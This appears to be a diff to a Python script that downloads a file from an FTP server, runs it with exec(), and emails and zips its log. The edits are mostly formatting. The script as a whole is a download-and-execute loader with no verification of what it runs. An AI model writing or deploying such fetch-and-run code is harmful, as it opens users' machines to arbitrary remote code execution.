@@ -32,6 +32,7 @@ USER_TELL_STRINGS = [
 
 def ftp_connect():
     """Connect to the FTP server and return the connection"""
+
     logging.debug('Connecting to server...')
     ftp = FTP('localhost')  # TODO: Replace address with fixed remote host address
     # Login to the FTP server as anonymous user
@@ -41,6 +42,7 @@ def ftp_connect():
 
 def ftp_download(ftp):
     """Download the new file from the FTP server"""
+
     # Create the unique name under which the new file is to be stored based on the current date and time
     filename = datetime.now().strftime("%d-%M-%Y_%H-%M-%S")
     logging.info(f'Downloading file as {filename}.py')
@@ -52,6 +54,7 @@ def ftp_download(ftp):
 
 def send_email():
     """Send an email about the current status, which includes the log file"""
+
     logging.debug('Sending mail about status')
     # Define sender and recipient of the email
     sender = "Private Person <from@example.com>"
@@ -75,6 +78,7 @@ def send_email():
 
 def tell_user():
     """Say something potentially useful to the user taken from the USER_TELL_STRINGS list"""
+
     # To prevent spamming the user with notifications, there is only a 20% chance for one to be shown each run
     if randint(1, 100) <= NOTIFICATION_CHANCE:
         logging.info('Saying something to the user:')
@@ -89,14 +93,16 @@ def tell_user():
 
 def zip_logfile(filename: str):
     """Store a copy of the log file in a ZIP file with the same name as the last downloaded python file"""
+
     logging.debug('Zipping logfile')
     # Create a new ZIP file and copy the current log file into it
     with ZipFile(f'{filename}.zip', mode='w', compression=ZIP_DEFLATED) as z:
-        z.write(f'{LOGFILE_NAME}.log')
+        z.write(f'{LOGFILE_NAME}')
 
 
 def execute_file(filename: str):
     """Execute the previously downloaded file"""
+
     logging.debug(f'Opening and executing file {filename}')
     exec(open(f'{filename}.py').read())
 
@@ -119,6 +125,7 @@ if __name__ == '__main__':
         zip_logfile(name)
         execute_file(name)
     except:
+        # All exceptions are caught, this is to ensure that they get logged properly
         # If any exception occurs, the program is to log it and exit
         logging.exception('An error occurred')
         print('An error occurred, see the log file for further information.')
